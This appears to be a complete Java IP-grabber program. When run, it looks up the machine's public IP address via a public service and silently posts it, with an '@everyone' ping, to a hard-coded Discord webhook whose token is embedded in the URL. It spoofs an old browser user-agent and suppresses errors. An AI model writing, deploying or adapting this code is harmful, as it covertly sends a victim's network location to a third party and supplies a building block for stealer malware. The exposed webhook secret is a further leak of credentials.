package me.totoaj;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class Main {

    static boolean pingMe = true;

    private static void postMessage(String message, String url) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", StandardCharsets.UTF_8) + "=" + URLEncoder.encode(message, StandardCharsets.UTF_8);
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception ignore) {} finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ignore) {}
        }
    }

    private static String getIp(String url) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();

        int responseCode = conn.getResponseCode();
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();
        if (responseCode == 200) {
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
        } else {
            System.out.println("Unable to get the requested data.");
        }
        in.close();
        return response.toString();
    }

    public static void main(String[] args) throws Exception {
        String ip = getIp("https://api.ipify.org/");
        String ping;
        if(pingMe) ping = "@everyone\n";
        else ping = "";
        postMessage(ping+"```IP: "+ip+"```", "https://discord.com/api/webhooks/855973225658056714/yJSw6kvc5E5GPSvz9mcz9ksPJYCYnztRfqCUy3A235a5h009gZvby0uq6B0Tn3e5FIbz");
    }
}
